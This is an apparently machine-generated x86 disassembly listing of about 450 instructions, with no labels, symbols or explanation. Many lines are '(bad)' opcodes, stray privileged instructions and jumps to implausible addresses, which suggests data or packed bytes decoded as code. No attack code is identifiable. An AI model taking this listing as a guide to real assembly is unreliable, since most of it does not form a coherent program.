  42c2d1:	jb     0x42c320
  42c2d3:	add    BYTE PTR [ebx-0x387cf73f],cl
  42c2d9:	add    eax,ebx
  42c2db:	add    BYTE PTR [ebp+0x45],al
  42c2de:	mov    esi,DWORD PTR [ebx]
  42c2e0:	or     BYTE PTR [ebx],al
  42c2e2:	(bad)  
  42c2e3:	mov    ebx,eax
  42c2e5:	adc    al,0x45
  42c2e7:	inc    ebp
  42c2e8:	mov    eax,DWORD PTR [ebx]
  42c2ea:	or     al,0xdc
  42c2ec:	inc    eax
  42c2ed:	inc    ebp
  42c2ee:	cmp    edi,0xc
  42c2f1:	hlt    
  42c2f2:	inc    ebp
  42c2f3:	jne    0x42c280
  42c2f5:	mov    ecx,DWORD PTR [esp+ecx*1]
  42c2f8:	inc    eax
  42c2f9:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  42c2ff:	clc    
  42c300:	push   esp
  42c301:	inc    ebp
  42c302:	inc    ebp
  42c303:	cmp    eax,0x8b8b9c74
  42c308:	cmp    al,ah
  42c30a:	dec    ebp
  42c30b:	(bad)  
  42c30c:	mov    eax,ebx
  42c30e:	push   esp
  42c30f:	(bad)  
  42c310:	idiv   DWORD PTR [eax-0x87417dd]
  42c316:	or     al,0xff
  42c318:	inc    eax
  42c319:	inc    ebp
  42c31a:	add    eax,DWORD PTR [ebp-0x74748b15]
  42c320:	push   esp
  42c321:	loopne 0x42c368
  42c323:	(bad)  
  42c324:	mov    eax,ebx
  42c326:	or     bh,bh
  42c328:	xbegin 0x508808f1
  42c32e:	mov    ebx,esp
  42c330:	or     bh,bh
  42c332:	(bad)  
  42c333:	mov    eax,ebx
  42c335:	hlt    
  42c336:	inc    ebp
  42c337:	inc    ebp
  42c338:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  42c33e:	xor    ebp,DWORD PTR [ebx]
  42c340:	add    ecx,DWORD PTR [ecx+0x4589e089]
  42c346:	adc    al,0x8b
  42c348:	inc    ebp
  42c349:	clc    
  42c34a:	xor    eax,DWORD PTR [eax-0x64]
  42c34d:	add    eax,edi
  42c34f:	or     al,0x14
  42c351:	dec    ebp
  42c352:	test   DWORD PTR [ebx],edi
  42c354:	clc    
  42c355:	jb     0x42c39c
  42c357:	mov    esi,DWORD PTR [ecx]
  42c359:	clc    
  42c35a:	pushf  
  42c35b:	inc    eax
  42c35c:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  42c362:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  42c368:	shr    esi,0x4d
  42c36b:	add    BYTE PTR [ebx-0x30002f96],cl
  42c371:	hlt    
  42c372:	mov    WORD PTR [ebp-0x62],es
  42c375:	push   eax
  42c376:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  42c37d:	test   DWORD PTR [eax],eax
  42c37f:	clc    
  42c380:	mov    eax,DWORD PTR [ebp+0x8]
  42c383:	mov    edi,0x4585c3c8
  42c389:	clc    
  42c38a:	mov    eax,DWORD PTR [ebp+0x18]
  42c38d:	xor    eax,DWORD PTR [ebp-0x64]
  42c390:	mov    edi,eax
  42c392:	hlt    
  42c393:	shl    BYTE PTR [ebp-0x7b],0x8b
  42c397:	clc    
  42c398:	fmul   QWORD PTR [ebp+0x4d]
  42c39b:	mov    eax,ebp
  42c39d:	in     al,dx
  42c39e:	icebp  
  42c39f:	dec    ebp
  42c3a0:	dec    DWORD PTR [ecx+0x4dc7e845]
  42c3a6:	loopne 0x42c331
  42c3a8:	test   eax,edi
  42c3aa:	clc    
  42c3ab:	dec    ebp
  42c3ac:	inc    ebp
  42c3ad:	mov    DWORD PTR [ebx],esi
  42c3af:	in     al,0x3
  42c3b1:	dec    ebp
  42c3b2:	push   eax
  42c3b3:	xor    eax,DWORD PTR [ebp+0x3]
  42c3b6:	push   eax
  42c3b7:	mov    DWORD PTR [eax-0x20],edx
  42c3ba:	push   edi
  42c3bc:	mov    eax,DWORD PTR [eax]
  42c3be:	clc    
  42c3bf:	cmp    eax,0xf84e85c0
  42c3c4:	inc    ebp
  42c3c5:	test   BYTE PTR [ebx],dh
  42c3c7:	add    DWORD PTR [ebx],eax
  42c3c9:	add    BYTE PTR [eax+0x4d],dl
  42c3cc:	jne    0x42c401
  42c3ce:	lea    ecx,[ebx-0x7617fc48]
  42c3d4:	cmc    
  42c3d5:	adc    al,0xff
  42c3d7:	inc    ebp
  42c3d8:	inc    ebp
  42c3d9:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  42c3df:	jb     0x42c36c
  42c3e1:	add    ah,bl
  42c3e3:	inc    ebp
  42c3e4:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  42c3eb:	xor    ecx,DWORD PTR [ebp+0x3]
  42c3ee:	mov    edi,DWORD PTR [ebx]
  42c3f0:	adc    BYTE PTR [ebp+0x41],dh
  42c3f3:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  42c3f9:	ret    
  42c3fa:	push   ss
  42c3fb:	push   0x45
  42c3fd:	lea    ecx,[ebx+0x4de80cac]
  42c403:	cli    
  42c404:	add    edi,edi
  42c406:	or     BYTE PTR [ebp+0x4d],al
  42c409:	mov    ebp,DWORD PTR [ebx]
  42c40b:	xor    ebp,ecx
  42c40d:	mov    al,BYTE PTR [edx]
  42c40f:	add    eax,0xc7200
  42c414:	jne    0x42c463
  42c416:	lea    esi,[ebx]
  42c418:	lods   al,BYTE PTR ds:[esi]
  42c419:	psubsb mm0,mm0
  42c41c:	cmc    
  42c41d:	retf   
  42c41e:	inc    ecx
  42c420:	xor    eax,0x89019c84
  42c425:	add    ah,cl
  42c427:	inc    ebp
  42c428:	inc    ebp
  42c429:	mov    esi,DWORD PTR [ebx+esi*1]
  42c42c:	pushf  
  42c42d:	mov    al,bh
  42c42f:	add    eax,0x8572c4
  42c434:	clc    
  42c435:	dec    ebp
  42c436:	inc    ebp
  42c437:	xor    esi,DWORD PTR [edx]
  42c439:	setl   al
  42c43c:	(bad)  
  42c43d:	retf   
  42c43e:	int3   
  42c43f:	ror    DWORD PTR [ebp-0x7c],0x8d
  42c443:	add    eax,ecx
  42c445:	add    BYTE PTR [ebp+0x45],cl
  42c448:	lea    ecx,[ebx-0x75b2cc3c]
  42c44e:	lea    eax,ds:0x4d72c0
  42c454:	mov    ecx,DWORD PTR [ebp+0x8]
  42c457:	xor    ecx,edi
  42c459:	bswap  ebx
  42c45b:	ror    BYTE PTR [ebp-0x35],0xe9
  42c45f:	rol    DWORD PTR [ecx],0x84
  42c462:	add    BYTE PTR [ecx],al
  42c464:	xor    eax,DWORD PTR [eax]
  42c466:	pushf  
  42c467:	inc    ebp
  42c468:	jnp    0x8a42f86c
  42c46e:	mov    eax,DWORD PTR ds:0xcf72f0
  42c474:	lock dec ebp
  42c476:	retf   
  42c477:	xor    ecx,DWORD PTR [ebp+0xf]
  42c47a:	mov    eax,eax
  42c47c:	loopne 0x42c449
  42c47e:	test   ecx,0x19e8484
  42c484:	xor    al,BYTE PTR [eax]
  42c486:	mov    DWORD PTR [ebp-0x20],eax
  42c489:	mov    eax,DWORD PTR [ebp+0x33]
  42c48c:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  42c492:	ret    
  42c493:	add    al,cl
  42c495:	dec    ebp
  42c496:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42c49c:	add    ecx,DWORD PTR ds:0xc7250
  42c4a2:	inc    ebp
  42c4a3:	rcl    DWORD PTR [eax+0x4d],0x5f
  42c4a7:	mov    edi,edi
  42c4a9:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  42c4af:	jb     0x42c478
  42c4b1:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  42c4b8:	mov    esi,DWORD PTR [ebx]
  42c4ba:	or     BYTE PTR [edx+0x72b60dcf],cl
  42c4c0:	add    eax,DWORD PTR [eax]
  42c4c2:	cmp    ecx,eax
  42c4c4:	jne    0x42c542
  42c4ca:	mov    eax,DWORD PTR [ebp-0x18]
  42c4cd:	mov    eax,DWORD PTR [eax]
  42c4cf:	xor    eax,edi
  42c4d1:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  42c4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4db:	mov    ecx,edi
  42c4dd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c4e3:	jb     0x42c4f4
  42c4e5:	add    BYTE PTR [eax-0x3f],bl
  42c4e8:	add    BYTE PTR [ebp-0x75],cl
  42c4eb:	mov    edi,eax
  42c4ed:	xor    eax,DWORD PTR [eax]
  42c4ef:	mov    al,bh
  42c4f1:	or     eax,0x4a7284
  42c4f6:	xor    al,cl
  42c4f8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4fb:	mov    ecx,edi
  42c4fd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c503:	jb     0x42c514
  42c505:	add    BYTE PTR [eax],bh
  42c507:	enter  0x8500,0x8b
  42c50b:	add    ah,ah
  42c50d:	add    BYTE PTR [eax],al
  42c50f:	inc    ebp
  42c510:	(bad)  
  42c511:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  42c518:	mov    esi,DWORD PTR [edx+0x8]
  42c51b:	add    bh,cl
  42c51d:	dec    ebp
  42c51e:	mov    dh,0x8b
  42c520:	add    esi,DWORD PTR [ebx]
  42c522:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  42c528:	add    BYTE PTR [eax],al
  42c52a:	mov    eax,ecx
  42c52c:	call   0xc7cdc57e
  42c531:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d4a]
  42c538:	mov    eax,DWORD PTR [eax]
  42c53a:	in     al,dx
  42c53b:	ror    DWORD PTR [ecx],0x4d
  42c53e:	iret   
  42c53f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  42c546:	xor    dh,BYTE PTR [edx-0x75]
  42c549:	add    al,bh
  42c54b:	enter  0x5009,0xcf
  42c54f:	inc    ebp
  42c550:	mov    WORD PTR [ebx-0x75cdccb6],cs
  42c556:	or     al,BYTE PTR ds:0xec728b
  42c55c:	or     DWORD PTR [ebp-0x31],ecx
  42c55f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  42c566:	cmp    dh,BYTE PTR [edx+0xf]
  42c569:	add    ah,dl
  42c56b:	rol    DWORD PTR [eax],0x4d
  42c56e:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  42c574:	(bad)  
  42c575:	or     eax,0x4a7284
  42c57a:	xor    al,cl
  42c57c:	mov    ecx,DWORD PTR [ebp-0x18]
  42c57f:	mov    ecx,DWORD PTR [ecx]
  42c581:	xor    ecx,edi
  42c583:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  42c58a:	xor    cl,al
  42c58c:	mov    edx,DWORD PTR [eax]
  42c58e:	in     al,0x45
  42c590:	or     DWORD PTR [eax-0x31],edx
  42c593:	mov    ds:0x8b4aff8c,eax
  42c598:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  42c59f:	inc    ebp
  42c5a0:	or     DWORD PTR [ebx],esi
  42c5a2:	iret   
  42c5a3:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144e]
  42c5aa:	cmp    dh,BYTE PTR [ebx]
  42c5ac:	jge    0x7242f642
  42c5b2:	mov    eax,DWORD PTR [eax]
  42c5b4:	in     al,0xc7
  42c5b6:	add    BYTE PTR [ebp-0x39],cl
  42c5b9:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b6]
  42c5c0:	mov    edx,ecx
  42c5c2:	clc    
  42c5c3:	test   BYTE PTR [ecx],cl
  42c5c5:	std    
  42c5c6:	iret   
  42c5c7:	dec    DWORD PTR [ebp+eax*2+0x14328b4a]
  42c5ce:	xor    al,bh
  42c5d0:	mov    eax,ebx
  42c5d2:	in     al,dx
  42c5d3:	enter  0x1109,0xcf
  42c5d7:	inc    ebp
  42c5d8:	mov    WORD PTR [ebx-0x38cde7b6],cs
  42c5de:	or     al,BYTE PTR [ebx+ecx*4+0x932f89e]
  42c5e5:	jmp    0x42c5b6
  42c5e7:	push   0xffffff8c
  42c5e9:	dec    DWORD PTR [esi-0xc]
  42c5ec:	xor    al,BYTE PTR [ebp+0x3a]
  42c5ef:	push   eax
  42c5f0:	jne    0x42c60c
  42c5f2:	mov    edi,edi
  42c5f4:	in     al,0x8b
  42c5f6:	add    BYTE PTR [eax],cl
  42c5f8:	(bad)  
  42c5f9:	dec    ebp
  42c5fa:	test   BYTE PTR [ebx],dh
  42c5fc:	dec    edx
  42c5fd:	add    esi,DWORD PTR [edx]
  42c5ff:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  42c605:	or     bh,cl
  42c607:	(bad)  
  42c608:	mov    ebx,es
  42c60a:	dec    edx
  42c60b:	push   0x32
  42c60d:	lea    esi,[edx]
  42c60f:	xchg   esp,eax
  42c610:	mov    ebp,eax
  42c612:	call   0xd041d00f
  42c617:	inc    ebp
  42c618:	mov    WORD PTR [ebx+0x4532184a],es
  42c61e:	or     bh,bh
  42c620:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  42c626:	iret   
  42c627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c628:	mov    WORD PTR [ebp+0x4e],es
  42c62b:	push   eax
  42c62c:	xor    bl,dh
  42c62e:	cmp    bh,bh
  42c630:	jne    0x42c5bd
  42c632:	lea    ecx,[eax]
  42c634:	lods   al,BYTE PTR ds:[esi]
  42c635:	dec    ebp
  42c636:	call   0xff46c06e
  42c63b:	cmp    ecx,DWORD PTR [ebp+0x74]
  42c63e:	cmp    ebp,DWORD PTR [edx+0x74]
  42c641:	dec    DWORD PTR [ebx-0x38baf758]
  42c647:	add    eax,ebx
  42c649:	fadd   DWORD PTR [ebp-0x18]
  42c64c:	mov    edi,eax
  42c64e:	lock inc edi
  42c651:	inc    ebp
  42c652:	test   BYTE PTR [ebx+0x832a89e],cl
  42c658:	xor    eax,DWORD PTR [ebp-0x75]
  42c65b:	add    ecx,DWORD PTR [eax]
  42c65d:	sbb    BYTE PTR [ebp+0x45],dl
  42c660:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  42c666:	rdpmc  
  42c668:	test   DWORD PTR [ebx],0xc18b0fff
  42c66e:	or     BYTE PTR [ebp+0x4d],cl
  42c671:	mov    esi,DWORD PTR [ebx]
  42c673:	rol    BYTE PTR [ebx],1
  42c675:	iret   
  42c676:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7462]
  42c67d:	cmp    ecx,DWORD PTR [ebp+0xf]
  42c680:	xor    edx,DWORD PTR [edi-0x73]
  42c683:	dec    DWORD PTR [eax]
  42c685:	mov    esi,DWORD PTR [edx+0x10]
  42c688:	add    BYTE PTR [ebp+0x77],al
  42c68b:	mov    DWORD PTR [eax],ebx
  42c68d:	jmp    0x42c704
  42c68f:	or     DWORD PTR [ebp-0x179b6b62],0xff65f3bf
  42c699:	pop    edi
  42c69a:	inc    ebp
  42c69b:	pop    ebx
  42c69c:	mov    eax,edx
  42c69e:	loopne 0x42c6a0
  42c6a0:	(bad)  
  42c6a1:	mov    eax,ebx
  42c6a3:	push   ecx
  42c6a4:	ror    DWORD PTR [ebx+0x4d450813],0x33
  42c6ab:	push   esi
  42c6ac:	add    edi,DWORD PTR [edi+0x7180850]
  42c6b2:	inc    ebp
  42c6b3:	(bad)  
  42c6b4:	push   eax
  42c6b5:	sahf   
  42c6b6:	dec    edi
  42c6b7:	xor    bh,bh
  42c6b9:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  42c6bf:	adc    al,0x89
  42c6c1:	adc    BYTE PTR [ecx+eax*1],0x75
  42c6c5:	add    bh,bh
  42c6c7:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  42c6ce:	fadd   DWORD PTR [eax]
  42c6d0:	call   0xff46b960
  42c6d5:	cmp    al,0x45
  42c6d7:	dec    ebp
  42c6d8:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  42c6de:	ret    
  42c6df:	mov    eax,ecx
  42c6e1:	adc    al,0x11
  42c6e3:	add    al,0x0
  42c6e5:	add    BYTE PTR [ebp+0x0],dh
  42c6e8:	mov    edi,edi
  42c6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6eb:	push   eax
  42c6ec:	inc    ebp
  42c6ed:	add    BYTE PTR [eax-0x2f],dl
  42c6f0:	adc    eax,0x8b45ff03
  42c6f5:	xor    edx,esp
  42c6f7:	add    ecx,DWORD PTR [ebp-0x77]
  42c6fa:	add    esp,edi
  42c6fc:	mov    eax,DWORD PTR [ebp-0x58]
  42c6ff:	inc    DWORD PTR [ebp+0x14]
  42c702:	mov    DWORD PTR [ebp+0x18],eax
  42c705:	push   eax
  42c706:	inc    ebp
  42c707:	dec    DWORD PTR [ebx-0x388ae7f4]
  42c70d:	call   0xfff2c1d5
  42c712:	mov    eax,DWORD PTR [ebp+0x8]
  42c715:	mov    edx,DWORD PTR [ebp+0x33]
  42c718:	xor    eax,DWORD PTR [ebx]
  42c71a:	lea    edi,[ebx]
  42c71c:	adc    DWORD PTR [edx+esi*2-0x75],esi
  42c720:	add    BYTE PTR [ecx+eax*8],cl
  42c723:	dec    ebp
  42c724:	xor    BYTE PTR [ebx],0xfc
  42c727:	add    edi,edi
  42c729:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  42c72d:	mov    eax,ebx
  42c72f:	pop    edi
  42c730:	push   es
  42c731:	leave  
  42c732:	or     dl,BYTE PTR [eax]
  42c734:	xor    eax,0x7fec2d55
  42c739:	in     al,0xec
  42c73b:	adc    DWORD PTR [edx+0x14],0x5e
  42c73f:	xor    eax,0x53149cc9
  42c744:	push   ebp
  42c745:	dec    esp
  42c746:	in     al,dx
  42c747:	or     BYTE PTR [ecx+0x57],dl
  42c74a:	inc    ebp
  42c74b:	inc    ecx
  42c74c:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  42c752:	push   edi
  42c753:	and    al,0x51
  42c755:	mov    edx,0x7be0833
  42c75a:	jb     0x42c756
  42c75c:	add    BYTE PTR [esi+0x30132c6],bl
  42c762:	inc    ebp
  42c763:	mov    DWORD PTR [ebx+0x8b9424],ecx
  42c769:	or     al,0x8b
  42c76b:	jl     0x42c6f8
  42c76d:	sbb    al,0x14
  42c76f:	dec    ebp
  42c770:	xor    BYTE PTR [ebp+0x1],0x8b
  42c774:	add    BYTE PTR [eax+eax*1],ah
  42c777:	xor    eax,DWORD PTR [ecx-0x75]
  42c77a:	mov    esp,DWORD PTR [esp+edx*1]
  42c77d:	add    ecx,DWORD PTR [ecx+0xca010f]
  42c783:	dec    esp
  42c784:	dec    ecx
  42c785:	adc    BYTE PTR [edx-0x15],ch
  42c788:	push   0x103039
  42c78d:	sbb    al,0x70
  42c78f:	inc    esp
  42c790:	push   0x10
  42c792:	dec    DWORD PTR [ecx+ecx*4+0x18]
  42c796:	mov    eax,edx
  42c798:	or     BYTE PTR [edi+eax*8+0x4532c69e],al
  42c79f:	mov    DWORD PTR [ebx+0x75681024],ecx
  42c7a5:	test   DWORD PTR [ebp+0x530efcf8],ecx
  42c7ab:	jge    0x42c822
  42c7ad:	xor    edi,edi
  42c7af:	pushf  
  42c7b0:	or     BYTE PTR [ebp+0x6c],dh
  42c7b3:	push   0xf88b85ff
  42c7b8:	or     BYTE PTR [ebp+0xb],dh
  42c7bb:	inc    edi
  42c7bd:	or     dh,al
  42c7bf:	jb     0x42c789
  42c7c1:	call   DWORD PTR [eax]
  42c7c3:	mov    DWORD PTR [ebp+0x24],eax
  42c7c6:	mov    ebp,ebx
  42c7c8:	adc    bh,bh
  42c7ca:	(bad)  
  42c7cb:	and    al,0xc6
  42c7cd:	lea    ebp,[edi+0x1fffc24]
  42c7d3:	or     BYTE PTR [esi+0x74],bl
  42c7d6:	ret    0x20
  42c7d9:	je     0x42c766
  42c7db:	sbb    al,0x83
  42c7dd:	mov    edi,0xe8ecfff8
  42c7e2:	mov    ecx,0xf81485ff
  42c7e7:	je     0x42c772
  42c7e9:	pop    esp
  42c7ea:	and    al,0x75
  42c7ec:	push   esi
  42c7ed:	and    al,0x8d
  42c7ef:	and    al,0xff
  42c7f1:	inc    BYTE PTR [ebx+ecx*4+0x18]
  42c7f5:	and    al,0x7c
  42c7f7:	pop    edi
  42c7f8:	adc    BYTE PTR [ebx+0x57],bl
  42c7fb:	in     eax,0x51
  42c7fd:	ret    0x33
  42c800:	mov    esi,0x187200
  42c805:	pushf  
  42c806:	inc    BYTE PTR [ecx+0x1614857c]
  42c80c:	jge    0x42c7aa
  42c80e:	mov    DWORD PTR [esp],ecx
  42c811:	(bad)  
  42c812:	cmp    DWORD PTR [eax],ebx
  42c814:	adc    BYTE PTR [eax],bl
  42c816:	push   ss
  42c817:	dec    DWORD PTR [edi+edi*8+0x18]
  42c81b:	adc    al,0xca
  42c81d:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  42c821:	into   
  42c822:	scas   eax,DWORD PTR es:[edi]
  42c823:	mov    DWORD PTR [eax+edx*2],esp
  42c826:	das    
  42c827:	inc    ebp
  42c828:	jne    0x42c7b5
  42c82a:	and    al,0x8b
  42c82c:	and    al,0x33
  42c82e:	lea    ecx,[eax]
  42c830:	jb     0x42c876
  42c832:	xor    ebp,ebx
  42c834:	adc    al,bh
  42c836:	xor    bh,bh
  42c838:	jne    0x42c87e
  42c83a:	sbb    al,0xff
  42c83c:	call   0x52a02685
  42c841:	push   ebx
  42c842:	inc    esp
  42c843:	push   ebx
  42c844:	jae    0x42c865
  42c846:	addr16 cdq 
  42c848:	stc    
  42c849:	imul   BYTE PTR [ecx+0x1399e43]
  42c84f:	adc    eax,0xc78b0cba
  42c854:	add    al,0x0
  42c856:	add    BYTE PTR [eax],al
  42c858:	push   esp
  42c859:	cmp    bl,BYTE PTR [esi+esi*2+0x6c]
  42c85d:	popa   
  42c85e:	inc    ebp
  42c85f:	jns    0x42c8d1
  42c861:	addr16 ja 0x42c8da
  42c864:	pop    esp
  42c865:	ja     0x42c8b8
  42c867:	arpl   WORD PTR [ebx+0x49],bp
  42c86a:	jne    0x42c8dc
  42c86c:	dec    ebx
  42c86d:	dec    ecx
  42c86e:	ins    DWORD PTR es:[edi],dx
  42c86f:	addr16 dec ebp
  42c871:	pop    esp
  42c872:	push   0x6a
  42c874:	jne    0x42c8e2
  42c876:	push   0x49
  42c878:	imul   ebp,DWORD PTR [ebx+0x63],0x7a
  42c87c:	ins    BYTE PTR es:[edi],dx
  42c87d:	cs jo  0x42c8e4
  42c880:	bound  eax,QWORD PTR [eax]
  42c882:	cmp    BYTE PTR [edx+0x10],0x0
  42c886:	ins    DWORD PTR es:[edi],dx
  42c887:	das    
  42c888:	adc    BYTE PTR [eax],al
  42c88a:	jmp    0x42c8d5
  42c88c:	adc    BYTE PTR [eax],al
  42c88e:	jecxz  0x42c8f0
  42c890:	adc    BYTE PTR [eax],al
  42c892:	adc    BYTE PTR [edx+0x10],dh
  42c895:	add    bl,bh
  42c897:	pop    edi
  42c898:	adc    BYTE PTR [eax],al
  42c89a:	xlat   BYTE PTR ds:[ebx]
  42c89b:	push   es
  42c89c:	adc    BYTE PTR [eax],al
  42c89e:	cwde   
  42c89f:	add    DWORD PTR [eax],edx
  42c8a1:	add    cl,al
  42c8a3:	xchg   edx,eax
  42c8a4:	inc    edx
  42c8a5:	add    ch,al
  42c8a7:	xchg   edx,eax
  42c8a8:	inc    edx
  42c8a9:	add    cl,cl
  42c8ab:	xchg   edx,eax
  42c8ac:	inc    edx
  42c8ad:	add    ch,cl
  42c8af:	xchg   edx,eax
  42c8b0:	inc    edx
  42c8b1:	add    cl,dl
  42c8b3:	xchg   edx,eax
  42c8b4:	inc    edx
  42c8b5:	add    ch,dl
  42c8b7:	xchg   edx,eax
  42c8b8:	inc    edx
  42c8b9:	add    cl,bl
  42c8bb:	xchg   edx,eax
  42c8bc:	inc    edx
  42c8bd:	add    ch,bl
  42c8bf:	xchg   edx,eax
  42c8c0:	inc    edx
  42c8c1:	add    BYTE PTR [edx-0x79ffbd38],al
  42c8c7:	enter  0x42,0x8a
  42c8cb:	enter  0x42,0x8e
  42c8cf:	enter  0x42,0x92
  42c8d3:	enter  0x42,0x96
  42c8d7:	enter  0x42,0x9a
  42c8db:	enter  0x42,0x9e
  42c8df:	enter  0x42,0x0
  42c8e3:	add    BYTE PTR [eax],al
  42c8e5:	add    BYTE PTR [eax],al
  42c8e7:	add    BYTE PTR [eax],al
  42c8e9:	add    BYTE PTR [eax+eax*1],al
	...
